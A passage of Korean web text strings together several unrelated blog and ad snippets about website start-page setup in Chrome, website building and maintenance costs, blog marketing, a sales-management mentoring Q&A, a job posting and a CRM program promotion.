장점이 있습니다.이러한 장점을 이용하여 검색창사이트가 아닌 내 사업의 홈페이지를 시작페이지로 설정하는 경우가 존재하는데요. ​인터넷창을 실행하자마자 내 홈페이지상황을 바로 파악할 수 있고 괜히 다른검색을 해보는 행동도 최소화할 수 있어서 효과적인 홈페이지 관리 중 하나인 것 같아요.​그렇다면 인터넷 시작페이지를 어떻게 설정하는지 살펴보겠습니다. 일반적으로 많이 사용하고 있는 크롬으로 안내하겠습니다. 홈페이지 관리를 위한 인터넷 시작페이지 설정 방법1. 설정 목록 찾기네이버 시작페이지크롬으로 인터넷창을 실행시키면 맨 우측 상단를 보면 점 세개로 보이는 아이콘이 존재하는데요. 이 아이콘은 크롬에서만 보여지는 아이콘으로 시작페이지뿐 아니라 여러 어떤 홈페이지에서도 동일하게 보여집니다. ​해당 아이콘을 클릭합니다.​ 네이버 시작페이지아이콘을 클릭하면 인터넷을 이용하는데 도움이 되는 메뉴목록들이 나오는데요. 그 중에 있는 '설정' 카테고리를 클릭합니다.​ 2. 시작그룹에서 변경크롬은 설정페이지 창이 따로 생기면서 인터넷 설정과 관련 메뉴들을 보여줍니다. 좌측 메뉴중 '시작그룹' 메뉴를 클릭합니다. ​ 시작그룹과 관련 내용들이 컨텐츠부분에 보입니다. 해당 3가지 목록이 보이네요. 시작페이지설정이 처음이라면 '새 탭 페이지 열기'에 체크가 되어 있을텐데요.  3가지 목록 중 '특정 페이지 또는 페이지 모음 열기'를 클릭합니다.​ 그리고 '새 페이지 추가'를 선택합니다.​'현재 페이지 사용'을 클릭하면 현재 열려있는 인터넷창 목록들이 다 입력되기 때문에 주의가 필요해요. 그래서 '새 페이지 추가' 클릭을 추천합니다.​ 3. 나의 홈페이지 주소 입력크롬안에서 인터넷주소를 입력할 수 있는 창이 나옵니다. 해당 입력창에 나의 홈페이지 주소를 입력하고 바로 밑 우측에 있는 추가버튼을 클릭합니다.​ 입력한 홈페이지가 목록에 나옵니다. 이렇게 특정 홈페이지주소로 설정을 하면 이 다음부터 크롬을 실행하게 될때 해당 홈페이지가 시작페이지로 보여집니다.​혹시 이렇게 했는데 바뀌지 않았다면 실행 중인 인터넷창을 모두 닫고 다시 크롬을 실행해보시면 됩니다. 그래도 안된다면 컴퓨터전원을 한번 끄고 키면 시작페이지가 설정한 홈페이지화면으로 보여질 것입니다.​ (주)디자인펀치 사이트로 시작페이지로 설정하고 다시 크롬을 열어보니 설정한 저희 홈페이지가 바로 보여지네요. 4.이미 인터넷 시작페이지가 설정되어 있는 경우시작페이지를 설정하려고 봤는데 이미 다른 홈페이지주소로 설정이 되어있다면 오른쪽에 바로 보이는 점 세개로 된 아이콘을 클릭하여 수정하면 됩니다.​ 우측 바로 보이는 수정 혹은 삭제 버튼메뉴를 통해 시작페이지를 관리할 수 있습니다.   이러한 과정으로 인터넷 시작페이지를 설정하면 홈페이지 관리가 더 수월해 질수 있습니다. 예를 들어 쇼핑몰을 운영하고 있다면 쇼핑몰사이트를 시작페이지로 설정해서 크롬을 실행하자마자 시간을 절약하며 쇼핑몰관리를 할수 있겠죠.​겉보기엔 사소할지라도 이러한 작은 시간이라도 아끼고 효율적으로 홈페이지 관리하는데 이용한다면 사업의 방향은 달라질수 있다고 생각해요.내 사업을 위한 홈페이지가 필요하시면 저희 (주)디자인펀치 소개란에 있는 전화번호를 통해 문의하여 효율적인 시간활용이 되시길 바라겠습니다. 홈페이지의 역할은 말할 필요도 없이 중요합니다.온라인상에서 홈페이지를 통해 개인 혹은 기업을알리거나 제품을 홍보하는 역할로써 활용되고 있죠​인터넷을 이용하지 않는 사람은 찾아보기 힘들 만큼모든사람이 이용하고 있다고 해도 틀린말은 아닙니다.​그렇기에 홈페이지제작 역시 더욱 꼼꼼하게잘 할 필요가 있습니다.하지만 전문가가 아니라면 사실 불가능하다고 생각됩니다.​요즘에는 개인이 미리 만들어 놓은 틀을 제공하는 업체를 통해 만들 수 있지만, 다 같은 디자인으로 활용도가 낮습니다 사업장 홈페이지로는 이용할 수 없어결국은 전문가를 통해 직접 제작해야 합니다.​​​   ​​결국 생각해야 할 건 비용이겠지요?오늘 소개시켜 드릴 포스팅 내용은 가장 합리적인방법으로 만들수 있는 업체 소개입니다.​알아보신 분들은 아시겠지만 홈페이지를 만드려면기본 백만원 단위가 넘어가게 됩니다.제가 알아 봤을때는 2백만원에서 3백만원 정도의견적을 받았습니다.​내가 제작 기술이 없기 때문에 이렇게라도 만들 수 밖에없는 상황입니다.​​   ​​오늘 소개시켜 드리는 업체는 홈페이지제작을비롯한 여러가지 서비스를 무료로 제공하는 업체입니다.​이래도 되나 싶을 정도로 많은 서비스를 무료로 지원해주는 곳입니다.아래 사진에 나와 있는 서비스들을 제공합고 있습니다.​​   ​​위 내용과 같이 홈페이지제작을 PC형 뿐만 아니라모바일 형 홈페이지를 무료로 만들어 주며,원하는 도메인 등록과 백업서비스 그리고 방화벽세팅까지 전부 무료로 지원 하는 곳입니다.시시때때로 발생하는 악성코드와 바이러스는기업은 물론 개인에게 까지 많이 피해를 주고 있죠혹시라도 발생할 수 있는 바이러스나 악성 코드로부터 보호하기 위해 백업서비스와 방화벽까지세심하고 신경쓰고 있습니다​   ​​이렇게 많은 서비스를 왜 무료로 해주는 걸까?물론 조건은 있습니다.관리서비스를 받아야 하는데요이용 절차를 설명드리기 전에 관리서비스가뭔지 알려드릴게요​홈페이지제작 시세대로 몇백만의 비용을 내고완성시키더라도 관리를 꾸준하게 잘 해야 합니다.​컨텐츠 업로드와 상황에 맞게 디자인도 변경되어야하겠죠 또 종종 알 수 없는 에러로 인해 접속이안되는 일이 발생하더라도 빠르게 조치를 취해야 합니다.​하지만 일반 제작 업체는 만들어주기만 하고관리 업무까지 하고 있지 않습니다.전문가의 손이 필요한 수정이나 에러가 발생하면다시 업체를 찾아 문제를 해결해야 합니다.​​   ​​오늘 소개시켜 드리는 곳은 홈페이지관리와 제작을전문적으로 하는 곳으로 계약기간동안 월3만원의적은 금액으로 모든걸 해결할 수 있습니다.​이 관리를 의뢰하면 위에서 말씀드린 제작을 비롯한여러가지 서비스를 제공받을 수 있습니다. ​다른 곳의 제작비용도 안되는 금액으로 PC형 모바일형 홈페이지제작 및 관리까지 모두 해결하실 수 있습니다. 그것도 분납으로!!!​​​   ​​홈페이지 의뢰 상담 받으러 가기​​위 사이트에 들어가시면 내용들이 보기 쉽게자세히 설명되어 있습니다.​사실 이곳 말고도 관리까지 해주는 곳도 있습니다.하지만 임대형으로 렌트방식이며, 임대형홈페이지업체에비하면 84%의 비용을 절감할 수 있습니다.​보통의 임대형은 계약시 약 100만원 정도의 비용으로계약을 하고 계약기간이 만료되면 다시 고민해야 하죠하지만 오늘 소개시켜드리는 업체는 계약기간까지월 3만원씩 납부하고 소유권까지 이전되기 때문에고민할 필요가 없습니다. ​​   ​​온라인 광고를 조금이라도 알아보신 분들은정말 잘 아시겠지만, 포털사이트 노출 전쟁입니다.홈페이지를 아무리 잘 만들어 났더라도다른사람들이 잘 확인 할 수 없다면, 만들 필요가 없죠​조금이라도 노출이 잘 되기 위해서 여러 포털사이트에제작한 홈페이지 등록까지 알아서 해주는 곳이죠​​특히 사업을 이제 막 시작하시는 분들이라면처음에 큰 금액이 들어가는 비용은 부담이 클 수 밖에없고 홈페이지에까지 신경 쓰기가 힘든데요월에 3만원씩 인터넷 요금 빠져나가듯 나가고관리까지 알아서 해주니 얼마나 편한지 모르겠어요​​   ​보통 이렇게 많은 혜택을 주는 곳은 아무래도 이제 막 생긴 업체들이 홍보성으로 하는 이벤트 상품이 많죠 그런데 자세히 알아보니 뜻밖이었죠​경력이 이렇게 많은 곳이 너무 혜택이 좋았기 때문이죠​아래 사진에서 처럼 경력이 7년이 되는 곳이고제작 건수만 하더라도 1만건이 넘게 작업을 했어요노하우가 엄청나게 쌓여 있겠죠​​   ​어쩐지 홈페이지제작 과정에서 담당자와 의사소통이 너무 잘되었죠 ​우리 업체가 강조하고 싶은 이미지를말했는데 추상적으로만 생각하고 있던 모습들을홈페이로 제작해 주셨어요​특히 온라인쇼핑몰이나 기업홈페이지 경우 큰 도움을 받을 수 있을거라 생각이 됩니다.​​사이트 제작 자세히 알아보기​​이미 만들어진 구성을 그대로 사용하는 템플릿 형태가 아닌 전문 디자이나들이 직접 제작하는 곳이기 때문에나만의 홈페이지를 가질 수 있습니다. ​아래는 이미 제작한 홈페이지 디자인들입니다.​   ​​​보셔서 아시겠지만 전부 다양한 각기 개설을 살린디자인으로 더욱 전문성이 느껴집니다​직접 문의해보시고 결정하시기 바랍니다 감사합니다.   ​ * '홈페이지제작전문'은 아이코리아비즈의 블로그 별칭입니다.​안녕하세요.​홈페이지제작.kr입니다.​홈페이지 제작만 한다고 끝이 아니죠.제작을 했다면 꾸준한 관리가 필요합니다.오늘은 홈페이지관리, 즉유지보수에 대해 알아보고자 합니다.​유지보수란 무엇이며유지보수가 왜 필요한지,그리고 유지보수 비용을절감할 수 있는 방법은 무엇인지지금부터 알려드리겠습니다!​  ​ 홈페이지 관리란?​홈페이지 제작이 완료되면그 홈페이지가 웹상에 온전히떠 있을 수 있도록 해야합니다.이를 위해서는 호스팅과 도메인이 필요하고꾸준한 홈페이지 업데이트와소스, 오류 관리 등이 필요하지요.​이런 걸 통틀어 홈페이지 관리, 즉유지보수라고 합니다.​웹상에 떠 있는 홈페이지를관리하지 않고 그대로 방치할 경우홈페이지상에 생긴 오류를 바로잡기 어렵고내용 업데이트가 되지 않으므로'관리되지 않는 홈페이지'라는인상을 남길 수밖에 없습니다.따라서 제작 후에는 유지보수가 필요한데요.​유지보수는 크게 3가지로 나눌 수 있습니다.​  ​ 유지보수에 대해 알아보자​(1) 운영 유지 관리회원 관리나 게시판 글쓰기 및 답변 관리,팝업 관리 등을 말할 수 있으며쇼핑몰이라면 상품 등록 및 주문, 배송 관리 등이 포함됩니다.​해당 부분들은 홈페이지 제작 시관리자모듈에서 관리가 가능하도록 구현되며고객이 직접 관리하게 됩니다.해당 부분은 유지보수라기보다는직접 운영을 하는 부분에 가깝습니다.​제작 업체에서 말하는 유지보수란일반적으로 아래 3가지를 들 수 있습니다.​​(2) 디자인 유지 관리홈페이지 내 이미지를 변경하거나서브 페이지를 추가 또는 수정하는 경우,팝업 이미지 추가하는 경우 등에는디자인 유지보수가 필요합니다.​단순히 변경하는 방법을 안다고 하더라도직접 하는 것과 전문 웹디자이너의손을 거치는 것에는 차이가 있기 때문에디자인 유지보수는 업체에 직접 맡기는 것이 좋습니다.​​(3) 기술 유지 관리기술이라는 것은 홈페이지 기능 관련 유지보수를 의미합니다.프론트엔드, 백엔드 전문 인력을 통해 가능한 영역입니다.간단한 기능 수정이라면 타 제작 업체에서도 가능하나,복잡한 기능의 경우 해당 홈페이지를 제작한 업체에맡기는 것이 좋습니다.​​(4) 서버 유지 관리호스팅 등 서버가 안정적으로연결될 수 있도록 하는 관리를 의미합니다.홈페이지 접속에 문제가 있는 경우가 있으면 안 되므로전문 업체를 통해 관리해주는 것이 좋습니다.​​이 중에서 디자인관리의 경우,직접 진행하고자 하시는 일이 종종 있는데디자인 감각이 필요한 부분이라전문 인력에 맡기시는 것이홈페이지 퀄리티를 유지할 수 있습니다^^​  ​ 홈페이지 관리 비용​유지보수 비용은 업체마다 다릅니다.어떤 업체는 1개월에 5만원을 기준으로 계약하고,어떤 업체는 1년을 기준으로 계약하기도 합니다.​또 어떤 곳은 건바이 건으로 유지보수를 맡기기도 합니다. ​ 유지보수 비용과 호스팅 비용을분리할 것인지, 포함할 것인지도 차이가 있어이런 사항을 꼼꼼히 체크하시는 게 좋습니다.​  ​ 어떻게 해야 더 저렴할까?​유지보수 비용을 절감하려면월 단위 결제와 연 단위 결제 중어떤 방법이 더 좋은지 고민이실 텐데요.​비교 방법은 간단합니다.​만약 1년 기준 유지보수 비용이 15만원인 업체와1개월에 3만원인 업체가 있다면.. 계산해보면 됩니다.​ 월 유지비 3만원 X 12개월= 36만원...​1개월 단위로 생각할 땐 그리 비싸보이지 않지만1년간 낼 비용을 합산해보면 저렴한 편은 아닙니다.​만약 1년 유지보수 비용이 15만원일 때,이 비용에 호스팅 비용도 포함되어 있다면월 유지비용을 받는 업체보다 훨씬 저렴하다고 볼 수 있죠.​이렇게 1년을 기준으로 계산해서어떤 업체가 더 저렴한 견적을 내세우는지판단한 뒤 홈페이지 관리를맡기는 것이 좋을 것입니다^^​저희 업체의 경우건바이건 유지보수도 가능하고보통 1년 기준으로 유지보수 진행하고 있으며호스팅 비용이 포함되거나 제외된 경우를 모두가능하게 유지보수  안내해드리고 있습니다!​  ​ 유지보수, 꼭 전문업체에 맡겨야 하나요?​앞서 잠깐 말씀드리기는 했지만유지보수는 가급적 직접 하시기보다는업체에 맡기시는 걸 추천드립니다.​회사에 전담 관리 부서가 있는 게 아니라면 말이죠..​간단한 수정 정도는 직접 할 수 있겠으나간혹 소스 오류나 서버 문제 등뜻하지 않은 문제로 홈페이지에오류가 생기는 일이 종종 있습니다.또는 관리자 PC를 통해 악성코드 등이감염될 가능성도 적지 않죠.​이 경우 직접 대처하는 것보다전문 유지보수 업체가 대처하는 것이더 빠른 판단과 대응, 해결이 가능합니다.​  ​ ​오늘은 홈페이지 관리에 대해 알아보았습니다.​유지보수 비용 절감 꿀팁 포인트 3가지를영상으로도 정리하였으니 복습해보시기 바랍니다^^​제작 뿐만 아니라저희가 만들지 않은 홈페이지유지보수도 진행하고 있으니,홈페이지관리 관련으로언제든 편하게 문의주시기 바랍니다.​  ​ 전국 언제 어디서나홈페이지제작 유지보수 문의는1661-5668온라인 바로 문의도 가능합니다.http://xn--hu5b4brvf8c73w61d.kr/bbs/write.php?bo_table=consulting 제작상담하기 글쓰기 | 홈페이지제작 is 홈페이지제작.kr홈페이지제작업체, 반응형, 1000여 고객사, 10년이상 노하우,xn--hu5b4brvf8c73w61d.kr ​ 안녕하세요, 멘토님. L 사의 화장품 영업 관리 직무를 희망하고 있는 취준생입니다. 직무와 관련해 궁금한 것이 많은데요. 우선 말씀드리고 싶은 고민은 이 직무가 B2C 영업인 것은 알고 있지만, 구체적인 직무 파악이 제대로 안 되고 있다는 점이에요. L 사 홈페이지에 있는 자료를 보면 영업 관리 직무는 “대리점, 할인점, 백화점, 홈쇼핑, 온라인 등 다양한 영업 채널 관리, 제품 판매 촉진을 위한 프로모션 기획 업무, 매장 판매사원 교육 등 광범위한 업무"를 수행한다고 하고요. 그중 방문판매 영업팀의 영업 담당자 직무 내용은 "거래처의 매출이나 채권을 관리하는 일은 물론 제품에 대한 정보를 수집/공유하여서 방문판매 대리점에 소속되어 계신 방문판매 컨설턴트분들이 당사의 제품을 소비자들에게 잘 알리고 판매하실 수 있도록 지원하는 활동도 한다"라고 나와 있어요. 이와 관련해서 제가 드리고 싶은 질문은 아래와 같습니다.​ ⒸRay Piedra 1. 홈페이지 직무 설명을 봐도 실제로 멘토님이 직접 현장이나 사무실에서 하시는 업무가 무엇인지 확 와 닿지가 않는데요. 구체적으로 설명 부탁드려요. 2. 영업 채널 관리는 어떤 방식을 통해 이루어지는지 궁금합니다. 3. 매출이 저조한 매장을 끌어올린 사례가 있으신가요? 또 프로모션 기획은 어떤 시기에 어떤 전략으로 이루어지는지도 궁금합니다. 4. 마지막으로 직무 역량에는 어떤 것이 있는지 알고 싶습니다. 멘토님의 현업 경험을 듣고 싶습니다. 바쁘실 텐데 소중한 시간 내어 주셔서 정말 감사합니다.  멘티님, 안녕하세요. 영업 관리 쪽으로 취업을 준비 중이시네요. 궁금한 점이 많으시니 바로 답변을 드려 볼게요.​ Ⓒfreepik 주된 업무는 영업준비와 회의영업 관리 담당자의 업무는 크게 두 가지 꼭지로 이루어지는데요. 그 첫째는 영업 준비와 회의에요. 우선 출근을 하면 메일부터 확인합니다. 영업 지원이나 마케팅, 물류 등 유관 부서에서 온 메일들이 굉장히 많죠. 일일이 확인해서 거래처 또는 팀 자체적으로 해야 할 업무들을 정리합니다. 그다음 매출을 확인하고, 사내 전산망(sap)을 통해 제품의 재고 현황과 입고 일정을 확인해요. 일 단위 또는 실시간으로 매출을 확인하면서 담당하고 있는 각 거래처의 이슈를 실시간으로 파악해야 하는데요. 매출의 증감 현황을 알아야 대책을 수립할 수 있기 때문이에요. 또 대리점 단위로 요청한 제품들이 있기 때문에 해당 품목에 대한 입고와 생산 현황도 꿰고 있어야 합니다. 이 밖에도 거래처 방문 스케줄을 확인해야 하고요. 필요한 경우에는 계획대로 영업이 잘 진행되고 있는지 중간 현황 파악 차원의 전략 회의를 진행하기도 합니다.  Ⓒschantalao ​​거래처 방문 여부에 따른 매출 발생 활동둘째 업무는 매출 발생 활동이에요. 이는 다시 거래처 방문 여부로 나뉘는데요. 먼저 거래처를 방문하지 않는 경우부터 말씀드릴게요. 우선 발주(출하) 전까지 거래처에 필요한 제품 / 프로모션 / 전략과 관련된 제반 활동을 수행하고요. 다음에는 전산을 조회해서 필요한 제품들을 수급하거나 재고 현황을 빨리 확인해서 거래처에 알려주는 활동들을 해요. 프로모션은 거래처 현황에 맞게 각 거래처 담당별로 풀어나가거나 팀이 자체적으로 판단해서 거래처 전반적으로 공통의 활성화 방안이라고 생각이 드는 경우 팀 전체 PM을 수립합니다.  예를 들어...​(중략)​​[LG생활건강 현직자를 만나보세요!]​ 영업관리, 홈페이지 직무 설명과 실제 현장 업무는 어떻게 다른가요?L 사의 화장품 영업관리 직무를 희망하는 취준생입니다. 해당 회사의 영업관리 직무가 B2C 영업인 것은 알고 있습니다. 하지만 홈페이지 직무 설명을 봐도 현장이나 사무실에서 하시는 업무가 무엇인지 확 와닿지가 않아 실제로는 어떠신지 궁금합니다. 또, 영업관리 업무 중 영업채널 관리는 어떻게 이루어지는지 궁금합니다.www.itdaa.net ​©모든 저작권은 해당 콘텐츠 제공자 또는 해당 콘텐츠 제공자와 잇다가 공동으로 보유하고 있으며, 콘텐츠의 편집 및 전송권은 잇다가 가지고 있습니다. 실명 현직자를 통해 믿을 수 있는 진로, 직무, 기업, 이직정보를 확인하세요. 현직자 멘토링 서비스, 잇다(itdaa)​ 비가 오는 월요일입니다.며칠 동안 더운 듯했는데오늘은 비 때문인지 제법 쌀쌀하네요.​감기 걸릴 뻔 -__-;;;;​​​​월요일의 오후에서 슬슬 저녁으로 넘어가는 시간입니다.오늘도 알찬 하루 보내시고 있나요?​^^*​​​저희가 홈페이지처럼 제작했던 학원  블로그에 대해올려드리고자 합니다.​​ ​​​회사나 개인뿐만 아니라 공부방이나 학원에서도 블로그 운영의 중요성과효율성에 대해 많이들 인지하시고의뢰가 많이 들어오고 있습니다.​​​마케팅을 전혀 모르시는학원 원장님들께서는블로그 제작만 갖추어두면왜인지 모든 홍보가 원활히 진행될 것 같다는생각을 하시던데이 부분에서 좀 걱정도 되고 ^^;​해서 몇 가지 말씀을 드리려 합니다.​​​​​ ​​​예쁘게 스킨만 만들어 두고고객들이 언제 연락을 줄까 기다리고 계시기만 한가요?​​  ​아뇨.. 그러심 절대 안 되십니다.​​블로그 마케팅의 핵심은 바로 콘텐츠죠.학원이면 학원으로서의 회사면 그 회사 자체의 업종에 대한 내용으로저희 같은 디자인 업체이면 디자인에 관한여러 콘텐츠로 양질의 내용을 지속적으로포스팅해야만 합니다.​​양질이라고 해서 멋진 디자인과현란한 글 솜씨만을 의미하지는 않아요.​​내가 홍보하고자 하는 고객들이 좋아할 만한 내용,그들이 궁금해할 만한 내용 등을포스팅하면 됩니다.​​​​ ​​​1. 고객의 눈높이에 맞춰 콘텐츠를 만들어라.​사람들이 궁금해할 만한 내용을(내 업종에 맞는 내용으로 여)너무 고급스럽고 어려운 전문 내용으로서만이 아닌그 누가 보더라도 쉽게 이해되고 공감 가는 내용으로포스팅하시기를 권해 드립니다.​​​​​ ​​​2. 글의 주제는 명확하게 한다.​글의 주제를 너무 넓거나 애매하게 정하지 말고명확하고 구체적으로 정해서사람들에게 알려주는 것이 좋습니다.​내 회사나 브랜딩에 맞지 않은 주제를 자주선정하는 것은 지양해야 할 것입니다.​​​​​ ​​3. 포스팅하는 주제를 뒷받침하는 논리적 근거를 나열하라.​주제에서 벗어나지 않는 범위 내에서일관성 있고 읽는 사람들이 납득하며 인지할 수 있도록내 글을 뒷받침하는 논리적 근거를 3~5가지 정도 나열하여 정리합니다.​​​​ ​​4. 자신이나 업체의 색깔을 가지고 포스팅하라.​브랜딩이라고도 하지요.​다른 업체를 흉내 내는 것 말고나만의 내 회사만의 색을 가지고 포스팅합니다.​​캐릭터를 앞세워 브랜딩을 할 수도어투나 컬러로도 어필할 수 있습니다.​어떻게 보이길 바라는지 목표를 정하고그에 맞추어 일관성 있게양질의 글을 나만의 색깔로 스토리텔링 하시길추천드립니다.​  ​​​간단하게 말씀드렸는데어떠실지 모르겠네요. ^^*​​학원 블로그 제작을 홈페이지처럼 만들어 드렸습니다.그러나 홈페이지는 아니기에(블로그잖아요?)홈페이지처럼 구현을 못 하는 부분들도 분명 존재합니다만​블로그라서 더 쉽게 글을 쓸 수 있고관리할 수 있다는 장점이 있습니다.​​게다가 네이버 내에서 발행되는 포스팅이기에검색이 용이한 장점이 정말 크지요.양질의 포스팅으로 주기적으로 글을 잘 쓰시고여러 부분을 공부하며 하나씩 업그레이드하다 보면광고비를 따로 쓰지 않아도검색 노출이 잘 될 수 있답니다.​한번 도전해 보시지 않으시렵니까?​​  ​  궁금할 땐 네이버 톡톡하세요!   ​ 홈페이지관리비용 : 필수로 들어가는 고정비용은?​홈페이지는 만들어 놨다고 해서 저절로 운영이 되는 게 아니라 세 가지 요건을 충족해야만 합니다.운영비용 또는 고정비용이라는 말은 도메인과 호스팅 서비스를 계속 유지하기 위해 납부하는 비용이라는 뜻으로 사용합니다.1년에 한번 꼭 납부해야만 하는 필수비용인데요.​오늘은 '홈페이지 운영에 필요한 고정비용'에 대해 알려드리겠습니다.​ 도메인 비용​홈페이지 운영을 위해서는 www.adcomm.kr과 같은 도메인 주소가 필요합니다.무료 도메인도 있지만 잘못 사용하면 이상한 회사로 오해를 받거나 신뢰에 문제가 생길 수 있으니 유료 도메인을 권장합니다.유료 도메인의 경우 1년 단위로 업체마다 차이가 있지만 고정으로 매년 대략 22,000원 비용이 발생합니다.​ 웹호스팅 비용​웹호스팅이란? 홈페이지의 내용이 저장되는 공간을 임대하는 것을 말합니다.매월 고정 비용이 들어가며 금액은 사양에 따라 달라집니다.​홈페이지가 온라인상에 노출이 되려면 인터넷이 연결된 서버에 홈페이지 자료를 넣고 도메인을 연결해야 합니다.이것을 모두 직접 하려면 고가의 전용선 비용과 서버를 구입해야 하는데요.​현실적으로 비용이 너무 많이 들게 되므로 불가능한 일입니다.그래서 서버의 일정 공간을 임대해 주고 비용을 받는 호스팅 서비스를 이용하는 것입니다.​그러므로 제작하려는 홈페이지의 방문자 등을 고려해 적정한 용량의 웹호스팅을 구입해야 합니다.용량이 초과되면 홈페이지가 일시 차단됩니다.​ 유지관리(보수) 비용​수백만 원의 홈페이지를 제작한다고 유지관리 서비스를 해주는 것이 아닙니다.기본 유지관리 기간이 종료가 되면 페이지 추가나 변경의 경우 추가 비용을 지불해야 합니다.유지관리 비용은 건별 비용 추가 방식과 작업 내용에 따라 월 2만원 이상의 유지관리 비용이 발생할 수 있습니다.​  더 다양한 홈페이지 운영 팁 보러 가기http://www.adcomm.kr​ 에이디커뮤니케이션홈페이지제작,반응형홈페이지제작,쇼핑몰제작,모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,각종 솔루션 제작,인천홈페이지제작 전문업체.www.adcomm.kr 2021년 온라인마케팅/홈페이지관리 정규직 사원 모집​​​저희 회사는 파생상품 관련  회사로 네이버 카페 및 방송 사이트를 운영 중에 있습니다.카페 및 사이트 관리와 더불어 온라인 마케팅  분야의 지원자를 구인 중입니다^^입사 시 기본적인 교육이 진행되니 부담 없이 많은  지원 바랍니다!모집부문 및 상세내용모집부문상세내용공통 자격요건ㆍ학력 : 대학 졸업 이상 (2, 3년제)ㆍ나이/성별 : 무관/여[주식회사플비] 온라인 마케팅 정규직 사원 모집1명담당업무ㆍ사이트 운영 및 관리, 자사 브랜드 온라인 마케팅 홍보(블로그/카페/SNS), 컨텐츠 제작​지원자격ㆍ경력 : 무관 (신입도 지원 가능 / 사원급)​우대사항ㆍ해당직무 근무경험, 포토샵 능숙자, 컴퓨터활용능력 우수, 인근거주자근무조건ㆍ근무형태:정규직(수습기간)-3개월ㆍ근무일시:주 5일(월~금) 오전 8시 30분~오후 5시 30분ㆍ급여:월급 190만원(상여금 별도 지급 : 설명절 50만원, 추석명절 50만원, 여름휴가비 지원 50만원, 퇴직금별도)ㆍ근무지역:(706-836) 대구 수성구 수성동4가 1022-7 두인빌딩 3층 - 대구 2호선 대구은행 에서 300m 이내​전형절차서류전형1차면접 진행후 필요시 2차면접최종합격접수기간 및 방법ㆍ접수기간:2021년 6월 22일 (화) 11시 ~ 2021년 7월 25일 (일) 24시ㆍ접수방법:사람인 입사지원ㆍ이력서양식:사람인 온라인 이력서유의사항ㆍ입사지원 서류에 허위사실이 발견될 경우, 채용확정 이후라도 채용이 취소될 수 있습니다.꼭 읽어보고 지원해주세요.ㆍ회사 설립이후 5년째 야근없음, 점심은 맛있는 배달음식, 듀얼모니터제공, 히터/에어컨 빵빵, 남녀구분화장실,   코로나 같은 위기상황에 재택근무, 소규모 사무실, 내일채움공제 가능ㆍ디자인회사가 아니라 온라인 마케팅회사입니다. 마케팅 제대로 하고싶고 배워보실 분만 지원해주세요.ㆍ자사 브랜드인 cafe.naver.com/pickm 무경차트 카페와 http://mkstock.co.kr 무경차트방송 홈페이지 운영중입니다.​ [주식회사 플비] [내채공가능] 온라인 마케팅 / 홈페이지 관리 정규직 사원 모집(D-32) - 사람인주식회사 플비, [내채공가능] 온라인 마케팅 / 홈페이지 관리 정규직 사원 모집, 경력:경력무관, 학력:대학졸업(2,3년)이상, 연봉:2,200~2,400만원 , 홈페이지:www.saramin.co.kr #대구, #대구취업, #취업, #취업공고, #스터디, #동영상촬영   안녕하세요. 혹시 디비쉐어에 대한 정보를 알고 계신가요?​ 요즘 많은 분들이 온라인을 통하여 마케팅을 진행하고 기업 혹은 브랜드를 홍보하고는 하죠. 이렇게 보시다시피 온라인이 많이 활성화 되어서 온라인의 인지도가 커졌는데요. 이렇게 온라인상으로 홍보를 제대로 시작하기만 해도 매출효과도 인상하고 기업의 이미지를 살릴수 있습니다. 요즘에는 많은 기업이 기본적으로 홈페이지를 하나씩 갖고 있으시죠? 홈페이지는 정말 중요한 역할을 하는데요, 업체에 관한 정보를 공유할수 있고 다양한 콘텐츠를 제공하여 소비자들의 관심을 유도하는 역할을 합니다. ​그렇다면 이런 홈페이지는 과연 누가 관리를 할까요? 물론 개인이 홈페이지를 관리할수 있겠죠? 글을 올리고 삭제하고 수정하고 홈페이지를 전체적으로 꾸미는건 개인이 할수 있습니다. 하지만 이런것 만으로도 홈페이지를 통한 마케팅이 효과가 있을까요? 또한 홈페이지관리를 계속해서 꾸준히 유지시킬수 있을까요? ​  반응형홈페이지관리 위한 프로그램 디비쉐어 2.0그래서 오늘은 반응형홈페이지관리를 위한 프로그램 하나를 소개시켜드릴까 합니다. ​   소비자관리 영업관리 차원에서 다양한 기능으로 관리가 가능한 프로그램 바로 디비쉐어 2.0이라는 프로그램인데요. 이전의 디비쉐어 1.0의 장점들을 종합시키고 단점들은 보완하여 재구성하였습니다. 이 프로그램은 다양한 기능이 있습니다. DB관리부터 분석까지 한번에 해결하실수 있는데요~​  단순 홈페이지 관리가 아닌 세부적으로 자세하게 기업을 관리하는 방법 단순홈페이지관리가 아닌 세부적으로 더 자세하게 기업을 관리할수 있습니다. 따로 업체에 부탁하지 않아도 충분의 기업의 힘으로 영업관리가 가능한데요. 체계적으로 관리에 들어가기 위해서는 새로운 도전이 필요한 법입니다. 영업에 있어서 소비자는 중요한 역할을 합니다. 소비자에 의해서 매출이 좌지우지 하게되는데요. 소비자의 만족도를 높여서 단골소비자도 생기고 기업이 더 발전할수 있습니다. 디비쉐어 프로그램을 통해서 소비자의 의견을 잘 반영할수 있고 정보관리는 물론이고 철저하게 분석하고 파악하여 똑똑한 영업이 가능합니다.    디비쉐어는 업체의 인바운드영업에도 큰 영향을 미칩니다. 인바운드영업이란 무엇일까요? ​  디비쉐어는 인바운드영업에 큰 영향을 미친다 인바운드란 찾아오는 고객을 맞이하는 것입니다. 이렇게 고객을 맞이하여 관리하는데 신경을써서 그것을 주로하여 영업을 하는것이 인바운드 영업인데요. 인바운드 영업에는 예를들면 고객센터, 1:1 문의전화, 상담전화 등이 있습니다. 모든 업체에는 이런 인바운드 영업이 베이스로 깔려져 있는데요. ​이런 인바운드 영업에만 신경을 써도 좋은 이미지를 남길수 있습니다. 요즘에는 인터넷의 발달로 소비자들 사이에서 업체에 대한 평가가 이루어지고 있는데요. 체계적이고 발빠른 인바운드 영업으로 소비자 개개인에게 좋은 인상을 남길수 있습니다. 기존의 영업방식에서 신경쓰지 못했던 부분까지 관리해보세요.   ​  디비쉐어 2.0 데이터 분석 통하여 마케팅의 효율을 높혀준다 우선 디비쉐어 2.0은 데이터 분석을 통하여 마케팅의 효율을 높여줍니다. 소비자가 적은것도 문제지만 나중에 소비자가 많아지면 관리하는것도 골치아픈 일 중 하나이지요. 소비자가 많아진다는 것은 기업이 커져서 일이 많아진다는 뜻인데요. 신경써야 할 부분도 많고 저마다 개개인의 특징이 다르니 데이터를 기록하는것도 일이고요. 하지만 디비쉐어는 그런점을 보완하기위해서 소비자의 정보를 하나하나 기록해드립니다. 우선 가장 대표적으로 소비자의 정보를 기록하는데요. 그 소비자가 어떻게 정보를 받고 유입되었는지 알수 있습니다. 우선 소비자가 유입되면 유입아이피와 유입주소를 파악할수 